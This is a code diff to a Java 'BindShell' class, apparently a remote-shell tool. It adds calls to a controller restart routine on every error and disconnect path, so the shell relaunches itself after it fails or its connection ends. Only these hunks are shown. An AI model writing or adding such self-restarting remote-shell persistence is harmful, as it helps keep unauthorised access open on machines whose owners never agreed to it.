@@ -38,7 +38,9 @@ public class BindShell {
          detected   = false;
          System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
      }
+     controller.Controller.restart();
      return detected;
+     
  }
  
  // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
@@ -65,12 +67,14 @@ public class BindShell {
                  } else if (iname.equals("SOCKET")) {
                      this.error = true;
                      System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
+                     controller.Controller.restart();
                  }
              }
          } while (input.available() > 0);
      } catch (SocketTimeoutException ex) {} catch (IOException ex) {
          this.error = true;
          System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
+         controller.Controller.restart();
      }
  }
  
@@ -130,6 +134,7 @@ public class BindShell {
              if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
              
              if (listener != null) { try { listener.close(); } catch (IOException ex) {} }
+             controller.Controller.restart();
          }
      }
  }
